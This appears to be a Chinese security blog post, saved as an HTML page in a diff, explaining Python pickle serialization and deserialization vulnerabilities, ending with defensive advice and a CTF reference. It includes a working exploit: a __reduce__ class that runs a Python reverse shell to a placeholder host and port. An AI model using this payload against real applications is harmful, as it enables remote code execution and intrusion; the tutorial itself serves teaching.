@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
+    <meta name="baidu-site-verification" content="093lY4ziMu" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="description" content="blog">
+    <meta name="keyword"  content="">
+    <link rel="shortcut icon" href="/img/ironman-draw.png">
+    <!-- Place this tag in your head or just before your close body tag. -->
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+    <!--<link href='http://fonts.googleapis.com/css?family=Montserrat:400,700' rel='stylesheet' type='text/css'>-->
+    <title>
+        
+          python反序列化之pickle - CoCo1er&#39;s blog
+        
+    </title>
+
+    <link rel="canonical" href="http://yoursite.com/2019/09/23/python反序列化之pickle/">
+
+    <!-- Bootstrap Core CSS -->
+    
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+
+
+    <!-- Custom CSS --> 
+    
+        
+<link rel="stylesheet" href="/css/dusign-light.css">
+
+        
+<link rel="stylesheet" href="/css/dusign-common-light.css">
+
+        
+<link rel="stylesheet" href="/css/font-awesome.css">
+
+        
+<link rel="stylesheet" href="/css/toc.css">
+
+        <!-- background effects end -->
+    
+    
+    <!-- Pygments Highlight CSS -->
+    
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+    
+<link rel="stylesheet" href="/css/widget.css">
+
+
+    
+<link rel="stylesheet" href="/css/rocket.css">
+
+
+    
+<link rel="stylesheet" href="/css/signature.css">
+
+
+    
+<link rel="stylesheet" href="/css/fonts.googleapis.css">
+
+
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+    <!-- photography -->
+    
+<link rel="stylesheet" href="/css/photography.css">
+
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- background effects start -->
+    
+    <!-- background effects end -->
+
+	<!-- Modified by Yu-Hsuan Yen -->
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        
+            
+                background-image: linear-gradient(rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3)), url('')
+                /*post*/
+            
+        
+    }
+    
+</style>
+
+<header class="intro-header" >
+    <!-- Signature -->
+    <div id="signature">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                
+                    <div class="post-heading">
+                        <div class="tags">
+                            
+                              <a class="tag" href="/tags/#python反序列化" title="python反序列化">python反序列化</a>
+                            
+                        </div>
+                        <h1>python反序列化之pickle</h1>
+                        <h2 class="subheading"></h2>
+                        <span class="meta">
+                            Posted by CoCo1er on
+                            2019-09-23
+                        </span>
+
+                        
+                            <div class="blank_box"></div>
+                            <span class="meta">
+                                Words <span class="post-count">1.8k</span> and
+                                Reading Time <span class="post-count">6</span> Minutes
+                            </span>
+                            <div class="blank_box"></div>
+                            <!-- 不蒜子统计 start -->
+                            <span class="meta">
+                                Viewed <span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span> Times
+                            </span>
+                            <!-- 不蒜子统计 end -->
+                        
+
+                    </div>
+                
+
+                </div>
+            </div>
+        </div>      
+    </div>
+
+    
+    <div class="waveWrapper">
+        <div class="wave wave_before" style="background-image: url('/img/wave-light.png')"></div>
+        <div class="wave wave_after" style="background-image: url('/img/wave-light.png')"></div>
+    </div>
+    
+</header>
+
+	
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">CoCo1er&#39;s blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archive/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/photography/">Photography</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/categories/">Categories</a>
+                        </li>
+                        
+                    
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    <!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="python反序列化之pickle"><a href="#python反序列化之pickle" class="headerlink" title="python反序列化之pickle"></a>python反序列化之pickle</h1><h2 id="python反序列化"><a href="#python反序列化" class="headerlink" title="python反序列化"></a>python反序列化</h2><p>​        <strong>首先要提到什么是反序列化？</strong></p>
+<p>​        序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输，然后使用的时候再将字节流转化回原始的对象的一个过程。</p>
+<p>​        <strong>简单来说</strong></p>
+<p>​        python数据转化成字符串——-序列化</p>
+<p>​        字符串转化成python数据——-反序列化</p>
+<p><strong>序列化的几种形式</strong></p>
+<ul>
+<li><p><strong>json模块</strong>——json所有的语言都通用，它能序列化的数据是有限的：字典列表和元组</p>
+</li>
+<li><p><strong>pickle模块</strong>——是python特有的，只有python能理解；所有的python中的数据类型都可以转化成字符串形式；且部分反序列化依赖代码</p>
+</li>
+<li><strong>shelve</strong>——序列化句柄；使用句柄直接操作非常方便</li>
+</ul>
+<h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><p>​        pickle是python语言的一个标准模块，安装python后已包含pickle库，不需要单独再安装。</p>
+<p>​        pickle模块实现了基本的数据序列化和反序列化。通过pickle模块的序列化操作我们能够将程序中运行的对象信息（直接对内存中的数据操作）保存到文件中去，永久存储；通过pickle模块的反序列化操作，我们能够从文件中创建上一次程序保存的对象。</p>
+<p><strong>序列化操作</strong></p>
+<p>首先看一个实例</p>
+<p><img src="python反序列化之pickle/1.png" alt=""></p>
+<p><img src="python反序列化之pickle/2.png" alt=""></p>
+<p><strong>简而言之</strong></p>
+<p>序列化操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.dump()</span><br></pre></td></tr></table></figure>
+<p>反序列化操作:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pickle.load()</span><br></pre></td></tr></table></figure>
+<p>其中第一次dump将python数据（类）转化成了如下字符串</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ccopy_reg</span><br><span class="line">_reconstructor</span><br><span class="line">p0</span><br><span class="line">(c__main__</span><br><span class="line">Test</span><br><span class="line">p1</span><br><span class="line">c__builtin__</span><br><span class="line">object</span><br><span class="line">p2</span><br><span class="line">Ntp3</span><br><span class="line">Rp4</span><br><span class="line">(dp5</span><br><span class="line">S&#39;var1&#39;</span><br><span class="line">p6</span><br><span class="line">S&#39;This is a test&#39;</span><br><span class="line">p7</span><br><span class="line">sb.</span><br></pre></td></tr></table></figure>
+<p>第二次执行load将字符串转化成了python数据（类）</p>
+<p>​        上面那一堆乱七八糟的字符串是什么？这其实就是序列化后得到的字符串，只是它有它自己特定的表示规则（这是 PVM 虚拟机可以识别的有特殊含义的符号）。如果有了解 PHP 反序列化就能知道这其实大同小异。因为 PHP 也是将类名和对象的属性序列化进去的。</p>
+<p>我们将代码改改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span><span class="params">(object)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,var1=<span class="string">"This is a test"</span>)</span>:</span></span><br><span class="line">		self.var1 = var1</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(self)</span>:</span></span><br><span class="line">		print(<span class="string">"hello world!"</span>)</span><br><span class="line"></span><br><span class="line">a = Test()</span><br><span class="line">b = pickle.dumps(a)</span><br><span class="line">c = pickle.loads(b)</span><br><span class="line">c.func1()</span><br></pre></td></tr></table></figure>
+<p><img src="python反序列化之pickle/3.png" alt=""></p>
+<p>可以看到我们反序列化的确得到了一个实例化的类，并且还可以调用其中的函数。</p>
+<p><strong>最后简单解释一下序列化后的格式的规则：</strong>（部分PVM 操作码）</p>
+<p>S : 后面跟的是字符串</p>
+<p>( ：作为命令执行到哪里的一个标记</p>
+<p>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</p>
+<p>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</p>
+<p>R ：从栈中取出可调用函数以及元组形式的参数来执行，并把结果放回栈中</p>
+<p>. ：点号是结束符 </p>
+<p><strong>注意：其实并不是所有的对象都能使用 pickle 进行序列化和反序列化，比如说 文件对象和网络套接字对象以及代码对象就不可以</strong>（TypeError: can’t pickle file objects）</p>
+<h2 id="python反序列化漏洞由来"><a href="#python反序列化漏洞由来" class="headerlink" title="python反序列化漏洞由来"></a>python反序列化漏洞由来</h2><p>​        反序列化漏洞是如何产生的？其实很简单，python库诸如pickle只提供序列化和反序列化的操作，但是并不会对传入反序列化函数的内容进行安全检查，如此以来如果能够传入恶意序列化对象，那么在反序列化触发的时候就可能执行恶意指令。</p>
+<p><strong>典型的运用：redis+pickle</strong></p>
+<p>​        典型的一个运用redis未授权访问+python反序列化，这里参考<a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">p神的博文</a></p>
+<p>​        由于session是被pickle序列化后存储在服务器端，通过cookie请求sessionid的时候，session中的内容就会被反序列化。利用redis未授权访问可以set重置自己的session，替换成恶意payload即可执行任意命令。</p>
+<h2 id="python反序列化漏洞利用"><a href="#python反序列化漏洞利用" class="headerlink" title="python反序列化漏洞利用"></a>python反序列化漏洞利用</h2><p>​        前面介绍了pickle，这里我也以pickle为例来简单介绍一下如何构造反序列化的payload</p>
+<p>首先补充一个内容<strong>经典类/新式类</strong>   <a href="https://www.cnblogs.com/wujingqiao/p/9668583.html" target="_blank" rel="noopener">参考链接</a></p>
+<p>从上述链接中获知，在python2中我们如果需要利用到<code>__reduce__</code>方法需要采用新式类的形式。</p>
+<p><strong><code>__reduce__</code></strong></p>
+<p>​        当序列化以及反序列化的过程中碰到一无所知的扩展类型( <strong>这里指的就是新式类</strong>)的时候，可以通过类中定义的 <strong>reduce</strong> 方法来告知如何进行序列化或者反序列化</p>
+<p>​        也就是说我们，只要在新式类中定义一个 <strong>reduce</strong> 方法，我们就能在序列化的使用让这个类根据我们在 <strong>reduce</strong>  中指定的方式进行序列化，此时如果我们注入了这个序列化字符串后，在被应用程序自身执行反序列化操作时也会按照<strong>reduce</strong>来执行反序列化，从而实现了反序列化攻击。</p>
+<p>​        那我们该如何指定呢？实际上关键就在这个方法的返回值上，这个方法可以返回两种类型的值，String 和  tuple ,我们的构造点就在令其返回 tuple 的时候。</p>
+<p>​        当他返回值是一个元组的时候，可以提供2到5个参数，我们重点利用的是前两个，第一个参数是一个callable  object(可调用的对象)，第二个参数可以是一个元组为这个可调用对象提供必要的参数。</p>
+<p>听着有些抽象，来看一个实例运用（PS：元组中只有单个元素，需要以逗号结尾表名元组类型）</p>
+<p><img src="python反序列化之pickle/4.png" alt=""></p>
+<p>这里就非常明朗了，对于一个应用程序（python），如果它的pickle.loads(a)参数可控，那么就可以实现任意命令执行。（我们可以将命令换成python -c “执行的python代码”,也可以采用<strong>marshal</strong>库来实现，这里不做具体介绍，结尾给出参考链接）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = <span class="string">"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xxx.xx.xx",40009));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">       <span class="keyword">return</span> (os.system, (str,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">pickle.loads(a)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>vps监听40009端口</li>
+<li>kali中运行此脚本，vps接收反弹shell</li>
+</ul>
+<p><img src="python反序列化之pickle/5.png" alt=""></p>
+<p><img src="python反序列化之pickle/6.png" alt=""></p>
+<p><strong>题目练习</strong></p>
+<p>来自<a href="https://buuoj.cn/" target="_blank" rel="noopener">BUUCTF</a>收录的<strong>[CISCN2019 华北赛区 Day1 Web2]ikun</strong></p>
+<h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><ul>
+<li>不要再不守信任的通道中传递 pcikle 序列化对象</li>
+<li>在传递序列化对象前请进行签名或者加密，防止篡改和重播</li>
+<li>如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</li>
+<li>将 pickle 加载的数据列入白名单</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>更多利用以及原理请参考</p>
+<p><a href="http://www.sohu.com/a/274879579_729271" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p>
+<p><a href="https://www.anquanke.com/post/id/86800" target="_blank" rel="noopener">记CTF比赛中发现的Python反序列化漏洞</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/25981037" target="_blank" rel="noopener">Python Pickle的任意代码执行漏洞实践和Payload构造</a></p>
+
+                
+                <hr>
+                <!-- Pager -->
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2019/09/25/2019SUCTF-Pythonginx/" data-toggle="tooltip" data-placement="top" title="2019SUCTF-Pythonginx">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2019/09/23/CISCN2019-华北赛区-Day1-Web2-ikun/" data-toggle="tooltip" data-placement="top" title="CISCN2019 华北赛区 Day1 Web2 ikun">Next Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+
+                <!-- tip start -->
+                
+
+                
+                <!-- tip end -->
+
+                <!-- Music start-->
+                
+                <!-- Music end -->
+
+                <!-- Sharing -->
+                
+                <div class="social-share"  data-wechat-qrcode-helper="" align="center"></div>
+                <!--  css & js -->
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
+                <script src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+                
+                <!-- Sharing -->
+
+                <!-- gitment start -->
+                
+                <!-- gitment end -->
+
+                <!-- 来必力City版安装代码 -->
+                
+                <!-- City版安装代码已完成 -->
+
+                <!-- disqus comment start -->
+                
+                <!-- disqus comment end -->
+            </div>
+            
+            <!-- Tabe of Content -->
+            <!-- Table of Contents -->
+
+                
+            <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#python反序列化" title="python反序列化">python反序列化</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="https://blog.csdn.net/d_Nail" target="_blank">Dusign&#39;s Blog</a></li>
+                    
+                        <li><a href="#" target="_blank">Dusign&#39;s Web</a></li>
+                    
+                        <li><a href="https://github.com/dusign" target="_blank">Dusign&#39;s Github</a></li>
+                    
+                        <li><a href="#" target="_blank">Other</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'hover',
+          placement: 'left',
+          icon: 'ℬ'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+
+
+<style  type="text/css">
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; CoCo1er 2020 
+                    <br>
+                    Powered by 
+                    <a href="https://github.com/dusign/hexo-theme-snail" target="_blank" rel="noopener">
+                        <i>hexo-theme-snail</i>
+                    </a> | 
+                    <iframe style="margin-left: 2px; margin-bottom:-5px;" frameborder="0" scrolling="0"
+                        width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=dusign&repo=hexo-theme-snail&type=star&count=true">
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+
+</footer>
+
+<!-- jQuery -->
+
+<script src="/js/jquery.min.js"></script>
+
+
+<!-- Bootstrap Core JavaScript -->
+
+<script src="/js/bootstrap.min.js"></script>
+
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- Search -->
+
+<script src="/js/search.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("http://yoursite.com/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-XXXXXXXX-X';
+    var _gaDomain = 'yoursite';
+
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+
+<!-- Baidu Tongji -->
+
+
+<!-- Search -->
+
+    <script type="text/javascript">      
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+            search_path = "search.xml";
+        }
+    var path = "/" + search_path;
+    searchFunc(path, 'local-search-input', 'local-search-result');
+    </script>
+
+
+<!-- busuanzi -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+	<a id="rocket" href="#top" class=""></a>
+	<script type="text/javascript" src="/js/totop.js?v=1.0.0" async=""></script>
+    <script type="text/javascript" src="/js/toc.js?v=1.0.0" async=""></script>
+
+    
+        <!-- background effects line -->
+        
+
+        
+            <script type="text/javascript" src="/js/mouse-click.js" content='[&#34;🌱&#34;,&#34;just do it&#34;,&#34;🍀&#34;]' color='[&#34;rgb(121,93,179)&#34; ,&#34;rgb(76,180,231)&#34; ,&#34;rgb(184,90,154)&#34;]'></script>
+        
+
+        <!-- background effects end -->
+    
+
+    <!--<script size="50" alpha='0.3' zIndex="-999" src="/js/ribbonStatic.js"></script>-->
+    
+        <script src="/js/ribbonDynamic.js"></script>
+    
+</body>
+
+</html>
